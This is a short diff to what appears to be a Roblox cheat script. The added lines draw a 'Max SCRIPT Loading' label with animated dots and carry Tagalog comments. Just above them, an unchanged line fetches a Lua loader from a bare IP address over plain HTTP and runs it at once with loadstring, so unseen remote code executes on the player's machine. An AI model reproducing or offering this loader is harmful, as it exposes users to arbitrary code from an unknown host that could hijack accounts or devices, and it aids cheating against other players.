@@ -133,3 +133,31 @@ end)
 
 ID="151de7d8-5ef0-4146-85b6-826df4581111";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = playerGui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = screenGui
+textLabel.Size = UDim2.new(0, 300, 0, 50)
+textLabel.Position = UDim2.new(0.5, -150, 0, 10) -- nasa middle top
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Max SCRIPT\nLoading"
+textLabel.TextColor3 = Color3.fromRGB(173, 216, 230) -- light blue
+textLabel.TextStrokeTransparency = 0 -- para lumabas ang outline
+textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0) -- itim ang gilid
+textLabel.TextSize = 28
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextYAlignment = Enum.TextYAlignment.Center
+
+task.spawn(function()
+	while true do
+		for i = 1, 3 do
+			textLabel.Text = "Max SCRIPT\nLoading" .. string.rep(".", i)
+			wait(0.5)
+		end
+	end
+end)
